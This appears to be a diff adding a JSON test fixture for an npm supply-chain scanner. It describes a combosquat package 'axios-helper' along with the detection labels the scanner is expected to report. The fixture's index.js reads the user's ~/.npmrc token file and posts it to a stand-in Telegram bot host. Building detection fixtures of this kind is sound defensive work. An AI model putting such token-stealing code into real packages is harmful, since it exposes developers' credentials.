@@ -1,0 +1,23 @@
+{
+ "ecosystem": "npm",
+ "expected": [
+  "combosquat",
+  "new-publisher-similar-name",
+  "sparse-metadata",
+  "exfiltration",
+  "suspicious-endpoint"
+ ],
+ "files": {
+  "package/index.js": "const fs = require(\"fs\");\nconst https = require(\"https\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst token = fs.readFileSync(path.join(os.homedir(), \".npmrc\"), \"utf8\");\nconst url = \"https://api.telegram.org.example.invalid/bot0000000000:FAKE-FIXTURE/sendMessage\";\nconst req = https.request(url, { method: \"POST\" });\nreq.write(JSON.stringify({ chat_id: 0, text: token }));\nreq.end();\n",
+  "package/package.json": "{\n  \"name\": \"axios-helper\",\n  \"version\": \"1.6.9\",\n  \"main\": \"index.js\"\n}"
+ },
+ "meta": {
+  "created_days_ago": 1,
+  "description": "Helpers for axios",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "axios-helper",
+ "pattern": "Combosquat that reads ~/.npmrc and sends it to a Telegram bot",
+ "version": "1.6.9"
+}
